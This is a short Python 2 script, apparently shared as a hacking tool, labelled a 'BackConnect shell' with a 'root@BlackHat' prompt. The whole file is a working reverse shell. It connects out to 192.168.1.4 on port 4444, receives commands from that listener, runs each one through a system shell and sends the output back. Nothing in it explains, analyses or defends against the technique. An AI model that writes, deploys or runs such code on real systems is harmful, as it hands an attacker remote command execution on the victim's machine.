#!/usr/bin/python
 
 
print """
 
           #################################################
           #                                               #
           #      @ Python BackConnect shell               #
           #      @ Redeveloped CAMOUFL4G3                 #
           #                                               #
           #################################################
 
 
     """
 
try:
 
     import socket,subprocess
 
     HOST = '192.168.1.4'
 
     PORT = 4444
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     s.connect((HOST, PORT))
 
     s.send('-----------------------------\n')
     s.send('[*] Connection Established!')
 
     s.send('\n-----------------------------\n')
     s.send('$ root@BlackHat: ')
 
     print "BackConnect shell is ready for to transmit data"
     while 1:
 
          buffersize = 1024
 
          data = s.recv(buffersize)
 
          proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
          stdout_value = proc.stdout.read() + proc.stderr.read()
 
          s.send(stdout_value)
 
     s.close()
 
except KeyboardInterrupt:
     print 'Connection broken'
